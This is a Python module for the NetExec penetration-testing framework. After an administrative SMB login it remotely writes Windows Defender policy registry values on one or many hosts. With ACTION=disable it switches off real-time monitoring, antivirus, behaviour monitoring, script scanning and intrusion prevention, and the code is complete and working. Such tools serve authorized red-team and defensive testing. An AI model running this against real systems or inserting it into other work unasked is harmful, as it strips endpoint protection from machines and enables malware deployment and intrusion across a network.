#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from sys import exit
from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations

# Registry keys for enabling Windows Defender
ENABLE_REGISTRY_KEYS = {
    "SOFTWARE\\Policies\\Microsoft\\Windows Defender": {
        "PUAProtection": 1,
        "ServiceKeepAlive": 1,
        "DisableRoutinelyTakingAction": 0,
        "DisableAntiSpyware": 0,
        "DisableAntiVirus": 0
    },
    "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection": {
        "RealtimeScanDirection": 0,
        "IOAVMaxSize": 0,
        "DisableScanOnRealtimeEnable": 0,
        "DisableRealtimeMonitoring": 0,
        "DisableOnAccessProtection": 0,
        "DisableIOAVProtection": 0,
        "DisableBehaviorMonitoring": 0,
        "DisableScriptScanning": 0,
        "DisableIntrusionPreventionSystem": 0
    }
}

# Registry keys for disabling Windows Defender
DISABLE_REGISTRY_KEYS = {
    "SOFTWARE\\Policies\\Microsoft\\Windows Defender": {
        "PUAProtection": 0,
        "ServiceKeepAlive": 0,
        "DisableRoutinelyTakingAction": 1,
        "DisableAntiSpyware": 1,
        "DisableAntiVirus": 1
    },
    "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection": {
        "RealtimeScanDirection": 1,
        "IOAVMaxSize": 1,
        "DisableScanOnRealtimeEnable": 1,
        "DisableRealtimeMonitoring": 1,
        "DisableOnAccessProtection": 1,
        "DisableIOAVProtection": 1,
        "DisableBehaviorMonitoring": 1,
        "DisableScriptScanning": 1,
        "DisableIntrusionPreventionSystem": 1
    }
}
# Reference
# https://admx.help/HKLM/Software/Policies/Microsoft/Windows%20Defender

class NXCModule:
    """Defender by @byinarie"""
    name = "defender"
    description = "Enables/Disables Windows Defender"
    supported_protocols = ["smb"]
    opsec_safe = False
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.action = None
        self.method = "smb"

    def options(self, context, module_options):
        '''
        Name: defender by @byinarie
        Description: Enables/Disables Windows Defender
        Supported Protocols: smb
        
        Options:
          ACTION          Enable/Disable Windows Defender (choices: enable, disable)
        
        Usage:
          nxc smb <target> -u <user> -p <password> -M defender -o ACTION=enable
          nxc smb <target> -u <user> -p <password> -M defender -o ACTION=disable
          
          nxc smb <target> -id 1 -M defender -o ACTION=enable
          nxc smb <target> -id 1 -M defender -o ACTION=disable
        '''
        
        if "ACTION" not in module_options:
            context.log.fail("ACTION option not specified!")
            print(NXCModule.help())
            exit(1)

        if module_options["ACTION"].lower() not in ["enable", "disable"]:
            context.log.fail("Invalid value for ACTION option!")
            print(NXCModule.help())
            exit(1)

        self.action = module_options["ACTION"].lower()

        if context.protocol != "smb":
            context.log.fail(f"Protocol: {context.protocol} not supported by this method")
            exit(1)

    def on_admin_login(self, context, connection):
        defender_smb = Defender_SMB(context, connection)
        defender_smb.defender_Wrapper(self.action)

    @classmethod
    def help(cls):
        help_text = f"""
        Name: {cls.name}
        Description: {cls.description}
        Supported Protocols: {', '.join(cls.supported_protocols)}
        
        Options:
          ACTION          Enable/Disable Windows Defender (choices: enable, disable)
        
        Usage:
          nxc smb <target> -u <user> -p <password> -M defender -o ACTION=enable
          nxc smb <target> -u <user> -p <password> -M defender -o ACTION=disable
        """
        return help_text

class Defender_SMB:
    def __init__(self, context, connection):
        self.context = context
        self.__smbconnection = connection.conn
        self.logger = context.log

    def defender_Wrapper(self, action):
        remoteOps = RemoteOperations(self.__smbconnection, False)
        remoteOps.enableRegistry()

        if remoteOps._RemoteOperations__rrp:
            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
            regHandle = ans["phKey"]
            registry_keys_to_set = ENABLE_REGISTRY_KEYS if action == "enable" else DISABLE_REGISTRY_KEYS
            self.set_registry_values(registry_keys_to_set, remoteOps, regHandle)

            remoteOps.finish()

    def set_registry_values(self, registry_keys_to_set, remoteOps, regHandle):
        for full_key_path, keys in registry_keys_to_set.items():
            try:
                ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, full_key_path)
                keyHandle = ans["phkResult"]
            except Exception as e:
                self.logger.debug(f"Failed to open key {full_key_path}, Error: {str(e)}")
                try:
                    ans = rrp.hBaseRegCreateKey(remoteOps._RemoteOperations__rrp, regHandle, full_key_path)
                    keyHandle = ans["phKey"]
                    self.logger.success(f"Created registry key {full_key_path} via SMB")
                except Exception as e:
                    self.logger.error(f"Error creating registry key {full_key_path}: {str(e)}")
                    continue

            for key_name, value in keys.items():
                try:
                    rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, keyHandle, key_name, rrp.REG_DWORD, value)
                    self.logger.success(f"Modified {key_name} to {value} via SMB")
                except Exception as e:
                    self.logger.error(f"Error modifying {key_name}: {str(e)}")
